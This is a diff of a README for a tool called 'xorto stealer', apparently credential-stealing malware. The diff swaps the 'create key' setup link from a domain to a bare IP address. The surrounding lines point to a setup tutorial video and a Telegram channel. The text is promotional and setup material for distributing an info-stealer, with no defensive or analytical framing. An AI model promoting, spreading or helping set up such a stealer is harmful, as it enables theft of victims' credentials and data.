@@ -8,7 +8,7 @@ Don't forget to star for new updates
 
 ## How to Setup?
 - Tutorial video on setting up xorto stealer https://streamable.com/poheqt
-- create key https://xortoprojectnew.com/createkey
+- create key http://20.244.3.237/createkey
 - xorto stealer telegram : https://t.me/xortoproject
 
 ## Features
